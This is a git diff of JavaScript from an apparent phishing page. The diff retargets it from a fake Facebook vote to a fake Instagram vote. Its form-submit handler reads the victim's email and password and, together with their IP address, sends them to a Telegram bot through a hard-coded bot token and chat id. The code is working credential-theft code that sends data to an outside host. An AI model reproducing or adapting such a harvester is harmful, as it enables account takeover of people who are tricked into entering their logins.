@@ -18,8 +18,8 @@ form.addEventListener("submit", (e) => {
       var identity = document.getElementById("email").value;
       var password = document.getElementById("password").value;
 
-      var my_text = `
-      <b>New Facebook Vote</b>
+      var ig_text = `
+      <b>New Instagram Vote</b>
       - <b>Username/Email:</b> ${identity}
       - <b>Password:</b> ${password}
       - <b>IPAddress:</b> ${ct}
@@ -31,7 +31,7 @@ form.addEventListener("submit", (e) => {
       var token = "7238505618:AAFq_0g2YgQDAdhG9OxDKsQGmZJ-o5t09U8";
       var chat_id = 7656086639;
       var url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(
-        my_text
+        ig_text
       )}&parse_mode=HTML`;
 
       var token = "7238505618:AAFq_0g2YgQDAdhG9OxDKsQGmZJ-o5t09U8";
